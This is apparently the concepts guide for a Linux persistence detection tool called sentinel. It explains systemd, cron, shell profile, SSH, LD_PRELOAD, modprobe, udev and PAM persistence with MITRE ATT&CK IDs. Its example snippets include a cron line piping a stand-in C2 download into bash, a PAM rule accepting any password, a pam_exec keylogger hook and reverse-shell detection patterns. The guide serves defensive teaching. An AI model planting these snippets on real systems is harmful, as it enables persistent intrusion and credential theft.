# Core Security Concepts

This document explains how Linux persistence works, why attackers use it, and how detection tools find it. These aren't definitions from a textbook. We'll walk through how real attacks play out and what makes each persistence location dangerous.

## Linux Persistence

### What It Is

Persistence is any mechanism that causes attacker code to run again after a reboot, logout, or service restart. The attacker's initial exploit gets them in the door. Persistence keeps the door open.

Linux has no central "startup programs" list. Code can be triggered by dozens of independent subsystems: the init system, the login sequence, the dynamic linker, the device manager, the job scheduler, the shell, and the authentication stack. Each one is a potential persistence location.

### Why It Matters

Without persistence, an attacker loses access the moment the compromised process dies or the system reboots. With persistence, they can survive reboots, kernel updates, password changes, and even partial incident response cleanup (if the responder misses one of the many locations).

The 2022 Orbit Linux malware demonstrated this perfectly. It installed itself via LD_PRELOAD in /etc/ld.so.preload, which meant every single process on the system loaded the malware's shared library. It hooked libc functions to hide its own files, network connections, and processes from tools like ls, netstat, and ps. Even if you knew what to look for, the malware was invisible because it controlled the libraries those tools depend on.

### The Persistence Lifecycle

```
Initial Access
    │
    ▼
Privilege Escalation (if needed)
    │
    ▼
Persistence Installation
    │   ┌──────────────────────────────────┐
    ├──▶│ systemd service                  │
    ├──▶│ cron job                         │
    ├──▶│ shell profile injection          │
    ├──▶│ SSH authorized_keys              │
    ├──▶│ LD_PRELOAD hijacking             │
    ├──▶│ kernel module autoload           │
    ├──▶│ udev rule                        │
    ├──▶│ PAM backdoor                     │
    └──▶│ ... 9 more categories            │
        └──────────────────────────────────┘
    │
    ▼
Callback / C2 Connection
    │
    ▼
Lateral Movement / Objectives
```

Attackers often install multiple persistence mechanisms as redundancy. If incident response finds and removes the cron job, the systemd timer still fires. If they clean the systemd timer, the shell profile injection still runs on next login.

## Persistence Categories

### Systemd Services and Timers (T1543.002, T1053.006)

Systemd is the init system on most modern Linux distributions. It manages services, timers, sockets, and device units. Attackers create or modify unit files to run arbitrary commands at boot or on a schedule.

A malicious systemd service looks like any other service:

```ini
[Unit]
Description=System Health Monitor

[Service]
ExecStart=/usr/local/bin/health-check
Restart=always

[Install]
WantedBy=multi-user.target
```

The difference is what `/usr/local/bin/health-check` actually does. It might be a reverse shell, a cryptocurrency miner, or a data exfiltration script. The unit file itself looks completely normal.

Systemd timers are the modern replacement for cron. They offer calendar-based and monotonic scheduling:

```ini
[Timer]
OnCalendar=*:0/5
Persistent=true
```

This fires every 5 minutes and catches up on missed runs. Attackers prefer timers over cron because timers integrate with systemd's dependency system and logging, making them harder to distinguish from legitimate system timers.

**What sentinel checks:** ExecStart/ExecStop/ExecReload directives for suspicious commands, world-writable unit files, recently modified units, drop-in overrides in .d directories, and .path units that trigger on filesystem changes.

### Cron Jobs (T1053.003)

Cron is the classic Unix job scheduler. It checks multiple locations:

```
/etc/crontab              System crontab with user field
/etc/cron.d/              Drop-in crontab fragments
/etc/cron.daily/          Scripts run once per day
/etc/cron.hourly/         Scripts run once per hour
/var/spool/cron/crontabs/ Per-user crontabs (crontab -e)
/etc/anacrontab           Anacron for machines not always on
```

A typical persistence cron entry:

```
*/5 * * * * root curl -s http://c2.example.com/update | bash
```

This downloads and executes a script every 5 minutes. The `curl | bash` pattern is one of the highest-confidence indicators of compromise because legitimate software almost never uses it in cron.

**What sentinel checks:** Every cron location for pattern matches against the detection engine. Parses crontab fields to extract the command portion, checks world-writable cron files.

### Shell Profile Injection (T1546.004)

Every time a user opens a shell, multiple initialization scripts execute in sequence:

```
Login shell:     /etc/profile → ~/.bash_profile → ~/.bashrc
Non-login shell: /etc/bash.bashrc → ~/.bashrc
Zsh:             /etc/zsh/zshrc → ~/.zshrc
```

Attackers inject commands into any of these files. The injected code runs with the user's privileges every time they log in or open a terminal:

```bash
export PATH="/tmp/.hidden:$PATH"
```

This prepends a hidden directory to PATH. Any commands the user runs (like `sudo`, `ssh`, `ls`) will first check `/tmp/.hidden` for a binary with that name. The attacker places trojanized versions there that capture credentials or execute additional payloads before calling the real binary.

**What sentinel checks:** All system and per-user shell RC files, /etc/profile.d/ scripts. Detects alias hijacking (`alias sudo=...`), PATH manipulation to temp directories, LD_PRELOAD exports, encoded payloads, network tool invocations, and background process launches.

### SSH Persistence (T1098.004)

SSH authorized_keys files support options that execute commands on login:

```
command="/tmp/.backdoor" ssh-rsa AAAA...
```

Every SSH login with this key runs `/tmp/.backdoor` before (or instead of) the user's shell. The `environment=` option can set arbitrary environment variables, including LD_PRELOAD.

Per-user `~/.ssh/rc` scripts execute on every SSH login, before the shell starts. The system-wide `/etc/ssh/sshrc` does the same for all users. These are legitimate features that attackers repurpose.

Dangerous sshd_config settings like `PermitRootLogin yes` and non-standard `AuthorizedKeysFile` paths are also indicators. Moving authorized_keys to an unusual location (`/opt/.keys/%u`) makes the backdoor harder to find during manual inspection.

**What sentinel checks:** authorized_keys for command= and environment= options, sshd_config for dangerous directives, ~/.ssh/rc and /etc/ssh/sshrc for existence and suspicious content.

### LD_PRELOAD Hijacking (T1574.006)

The dynamic linker loads shared libraries before the program's own libraries. LD_PRELOAD forces a specific library to load first, allowing it to intercept (hook) any function call.

```
/etc/ld.so.preload
```

Any library path in this file gets loaded into every dynamically-linked process on the system. This is the most powerful persistence mechanism on Linux because it's invisible to most detection tools. If the malicious library hooks `readdir()`, `stat()`, and `open()`, it can hide its own files from ls, find, and cat.

The Jynx2 rootkit, the Azazel rootkit, and the 2022 Orbit malware all used this technique. /etc/ld.so.preload should almost never contain entries on a production system.

**What sentinel checks:** /etc/ld.so.preload entries (any entry is suspicious; entries pointing to /tmp or /dev/shm are critical), /etc/ld.so.conf.d/ for library paths in temp directories, /etc/environment for LD_PRELOAD exports.

### Kernel Module Autoloading (T1547.006)

Files in /etc/modules-load.d/ list kernel modules loaded at boot. Files in /etc/modprobe.d/ can include `install` directives that run shell commands when a module loads:

```
install bluetooth /bin/bash -c '/tmp/.payload &'
```

This runs a shell command whenever the bluetooth module loads. The command field is passed to /bin/sh, so it can contain arbitrary shell code. Most administrators don't audit modprobe configurations because they rarely change.

**What sentinel checks:** modules-load.d for modules loaded at boot (info-level), modprobe.d for install hooks that invoke shell interpreters or network tools.

### Udev Rules (T1546)

Udev manages device events. Rules in /etc/udev/rules.d/ can trigger commands when hardware is plugged in, network interfaces come up, or block devices appear:

```
ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/.backdoor"
```

This runs a script every time a USB device is connected. The attacker only needs the target to plug in a USB device (or the system to detect a virtual one).

**What sentinel checks:** RUN+= directives for suspicious commands, shell interpreters, temp directory paths, and pattern engine matches.

### PAM Backdoors (T1556.003)

Pluggable Authentication Modules (PAM) control how Linux authenticates users. PAM configuration files in /etc/pam.d/ define a stack of modules for each service (login, sshd, sudo).

Two PAM-based persistence techniques:

1. **pam_exec.so** runs an external script during authentication:
```
auth optional pam_exec.so /tmp/.keylogger
```
This captures credentials as users authenticate.

2. **pam_permit.so** in the auth stack accepts any credential:
```
auth sufficient pam_permit.so
```
This allows login with any password. Attackers insert this before the real authentication module.

**What sentinel checks:** pam_exec.so entries (elevated severity when pointing to temp dirs or network tools), pam_permit.so in auth context.

### Additional Categories

**Init.d Scripts (T1037.004):** Legacy SysV init scripts in /etc/init.d/ and /etc/rc.local. Still present and executed on many systems for backward compatibility.

**XDG Autostart (T1547.013):** Desktop .desktop files in /etc/xdg/autostart/ and ~/.config/autostart/ that launch applications on graphical login. The Exec= field can contain arbitrary commands.

**At Jobs (T1053.001):** One-time scheduled jobs in /var/spool/at/. Less common than cron but often overlooked during incident response.

**MOTD Scripts (T1546):** Scripts in /etc/update-motd.d/ execute as root every time a user logs in to generate the message of the day.

**Logrotate Hooks (T1053.003):** Logrotate configurations can include postrotate/prerotate/firstaction/lastaction blocks that execute shell commands when logs are rotated. These run as root on a schedule.

**Systemd Generators (T1543.002):** Executables in /etc/systemd/system-generators/ and equivalent directories run early in the boot process to dynamically create unit files. They execute before most services start.

**Bash Completion (T1546.004):** Scripts in /etc/bash_completion.d/ and ~/.bash_completion source into every interactive shell session. Injected code runs whenever a user opens a terminal.

**Network Interface Hooks (T1546):** Scripts in /etc/NetworkManager/dispatcher.d/ and /etc/network/if-up.d/ execute when network interfaces change state. They run as root.

## MITRE ATT&CK Framework

### What It Is

MITRE ATT&CK is a knowledge base of adversary tactics and techniques based on real-world observations. Each technique has an ID (like T1543.002) that uniquely identifies it across the cybersecurity industry.

The framework organizes techniques into tactics (the "why") and techniques (the "how"):

```
Tactic: Persistence (TA0003)
├── T1543.002  Create or Modify System Process: Systemd Service
├── T1053.003  Scheduled Task/Job: Cron
├── T1546.004  Event Triggered Execution: Unix Shell Configuration
├── T1098.004  Account Manipulation: SSH Authorized Keys
├── T1574.006  Hijack Execution Flow: Dynamic Linker Hijacking
├── T1547.006  Boot or Logon Autostart: Kernel Modules
├── T1546      Event Triggered Execution
├── T1037.004  Boot or Logon Initialization: RC Scripts
├── T1547.013  Boot or Logon Autostart: XDG Autostart
├── T1053.001  Scheduled Task/Job: At
├── T1556.003  Modify Authentication Process: PAM
└── T1053.006  Scheduled Task/Job: Systemd Timers
```

### Why It Matters for Detection Engineering

Tagging findings with MITRE IDs serves three purposes:

1. **Communication:** Security teams use technique IDs as a shared vocabulary. "We found T1574.006" is immediately understood across organizations
2. **Coverage mapping:** Organizations can map their detection capabilities against the ATT&CK matrix to identify blind spots
3. **Threat intelligence correlation:** If threat intelligence says APT29 uses T1053.003 and T1546.004, defenders can prioritize detection for those techniques

## Heuristic Detection

### Pattern-Based Analysis

Sentinel doesn't just check if files exist. It analyzes their content using compiled regular expressions that match known-malicious patterns. The patterns are ranked by severity:

**Critical patterns** indicate almost-certain compromise:
- Reverse shell signatures: `/dev/tcp/`, mkfifo+nc, socat+exec, python/perl/ruby socket connections
- LD_PRELOAD manipulation in configuration files
- SUID bit manipulation: chmod +s, chmod 4755

**High patterns** indicate likely malicious activity:
- Download-and-execute chains: `curl ... | bash`, `wget -O /tmp/`
- Encoded/obfuscated payloads: base64 decode piped to execution
- Alias hijacking: redefining sudo, ssh, passwd to trojanized versions
- PATH manipulation to temporary directories
- Account creation commands in places they shouldn't appear

**Medium patterns** are suspicious but may be legitimate:
- Network tool invocations (curl, wget, nc) in startup scripts
- Inline script execution (python -c, perl -e)
- Temporary directory references in persistent locations
- Background process launches with nohup/disown

### Why Heuristics Over Signatures

Signature-based detection matches exact known-bad strings (like specific malware hashes). Heuristic detection matches behavioral patterns. An attacker can change their C2 domain every hour, but they still need `curl` to download and `bash` to execute. They can rewrite their reverse shell in any language, but it still needs to open a network socket and redirect stdin/stdout.

The tradeoff: heuristics produce more false positives than signatures. A legitimate cron job that uses curl to check a health endpoint will trigger the network tool pattern. That's why sentinel uses severity levels and the ignore-list mechanism: you baseline the system, suppress known-good findings, and focus on anomalies.

## Baseline Diffing

### The Problem

A production Linux server might have 50+ legitimate systemd services, dozens of cron jobs, and various shell profile customizations. Reporting all of these as findings creates overwhelming noise that makes real threats invisible.

### The Solution

Baseline diffing works in two phases:

1. **Save phase:** Scan the system in a known-good state. Save all findings as a JSON snapshot
2. **Diff phase:** Scan again later. Compare against the baseline. Report only findings that are new

The comparison uses a composite key of `scanner|path|title` to match findings across scans. If the same systemd service produced the same finding in both the baseline and current scan, it's suppressed. If a new cron job appeared since the baseline, it's reported.

This is the same concept behind file integrity monitoring tools like OSSEC and AIDE, applied specifically to persistence mechanisms.

## Testing Your Understanding

Before moving to the architecture, make sure you can answer:

1. Why would an attacker install multiple persistence mechanisms on the same system?
2. What makes LD_PRELOAD more dangerous than a cron job as a persistence mechanism?
3. Why does sentinel flag `curl` in a cron job as medium severity instead of immediately marking it critical?

## Further Reading

**Essential:**
- [MITRE ATT&CK Persistence Tactic](https://attack.mitre.org/tactics/TA0003/) - The authoritative reference for every technique sentinel detects
- [The Orbit Linux Malware Analysis](https://www.intezer.com/blog/research/orbit-new-undetected-linux-threat/) - Intezer's writeup on LD_PRELOAD-based rootkit evasion

**Deep dives:**
- [Linux Persistence Techniques](https://hadess.io/the-art-of-linux-persistence/) - Comprehensive catalog of persistence locations
- [systemd.exec(5)](https://www.freedesktop.org/software/systemd/man/systemd.exec.html) - Every directive sentinel parses in systemd units
